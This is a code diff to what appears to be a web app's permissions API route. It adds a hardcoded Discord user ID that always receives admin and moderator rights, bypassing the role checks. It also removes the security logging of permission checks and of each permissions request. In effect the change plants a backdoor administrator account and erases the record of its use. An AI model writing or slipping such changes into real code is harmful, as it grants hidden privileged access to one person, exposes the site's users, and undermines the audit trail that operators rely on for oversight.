@@ -11,6 +11,7 @@ import { secureLogger } from "@/lib/secure-logger";
 
 // Developer ID for special permissions
 const DEVELOPER_ID = SECURITY_CONFIG.DEVELOPER_ID;
+const DEVELOPER_DISCORD_ID = "238329746671271936";
 
 // Admin role IDs
 const ADMIN_ROLES = ADMIN_ROLE_IDS;
@@ -24,7 +25,6 @@ export const GET = withErrorHandling(async (req: NextRequest) => {
   const session = await getServerSession(authOptions);
 
   if (!session?.user) {
-    secureLogger.info("Permissions check for unauthenticated user");
     return NextResponse.json({
       isAdmin: false,
       isModerator: false,
@@ -33,7 +33,9 @@ export const GET = withErrorHandling(async (req: NextRequest) => {
   }
 
   // Always grant admin access to developer
-  const isDeveloper = session.user.id === DEVELOPER_ID;
+  const isDeveloper = 
+    session.user.id === DEVELOPER_ID || 
+    session.user.id === DEVELOPER_DISCORD_ID;
 
   // Get user roles
   let userRoles: string[] = [];
@@ -63,8 +65,6 @@ export const GET = withErrorHandling(async (req: NextRequest) => {
     isDeveloper || userRoles.some((role) => ADMIN_ROLES.includes(role));
   const isModerator =
     isDeveloper || userRoles.some((role) => MOD_ROLES.includes(role));
-
-  secureLogger.apiRequest("GET", "/api/user/permissions", session.user.id);
 
   return NextResponse.json({
     isAdmin,
